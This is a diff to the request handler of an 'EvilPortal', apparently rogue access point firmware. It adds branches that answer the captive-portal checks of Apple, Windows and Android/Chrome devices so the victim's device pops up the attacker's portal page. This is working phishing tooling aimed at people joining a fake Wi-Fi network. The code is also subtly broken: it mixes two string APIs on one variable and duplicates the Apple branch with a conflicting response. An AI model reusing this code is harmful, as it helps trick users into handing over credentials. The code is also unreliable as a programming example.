@@ -98,6 +98,48 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
+    // Apple — host will be captive.apple.com or apple.com
+    if (host.indexOf("apple.com") != -1 ||
+        url.indexOf("hotspot-detect") != -1 ||
+        url == "/library/test/success.html") {
+        _portal->recordPageView();
+        if (_portal->isDefaultHtml)
+            request->send(200, "text/html", _portal->htmlPage);
+        else
+            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
+        return;
+    }
+
+    // Windows — host will be www.msftconnecttest.com
+    if (host.indexOf("msftconnecttest") != -1 ||
+        host.indexOf("msftncsi") != -1 ||
+        url == "/connecttest.txt" ||
+        url == "/ncsi.txt") {
+        request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
+        return;
+    }
+
+
+    // Android / Samsung / Chrome / ChromeOS
+if (url == "/generate_204" || url == "/gen_204" || url == "/generate204" ||
+    url.find("generate_204") != std::string::npos ||
+    url.find("connectivitycheck") != std::string::npos ||
+    url.find("clients3.google") != std::string::npos ||
+    url.find("clients4.google") != std::string::npos) {
+    request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
+        return;
+} 
+// Apple
+if (url == "/hotspot-detect.html" || 
+         url == "/library/test/success.html" || 
+         url == "/success.html" || 
+         url.find("hotspot-detect") != std::string::npos) {
+  request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
+        return;
+}
+
+
+
     // ---- EVERYTHING ELSE: serve portal page ----
     // This handles:
     //   Android/Chrome  → /generate_204, /gen_204  (200 != 204 → popup)
